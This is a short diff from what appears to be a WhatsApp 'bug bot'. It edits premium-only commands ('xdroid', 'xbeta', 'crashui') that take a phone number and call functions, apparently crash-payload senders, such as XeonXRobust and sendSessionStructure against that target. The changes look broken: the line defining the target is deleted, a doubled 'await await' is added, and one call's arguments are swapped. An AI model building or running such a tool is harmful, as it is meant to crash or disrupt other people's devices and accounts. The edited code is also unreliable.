@@ -2195,8 +2195,6 @@ break
 case 'xdroid': case 'xbeta': case 'crashui': 
 if (!isPremium) return reply(mess.only.premium);
 if (!q) return reply(`Example: ${prefix + command} 62×××`);
-
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   
 reply(bugres);
 await sleep(1000)
@@ -2386,7 +2384,7 @@ await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
 await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await XeonXRobust(viper, XReturn);
+await await XeonXRobust(XReturn, viper, (cct = true), (Ptcp = true));
 await sleep(1500);
 await XeonXRobust(viper, XReturn);
 }
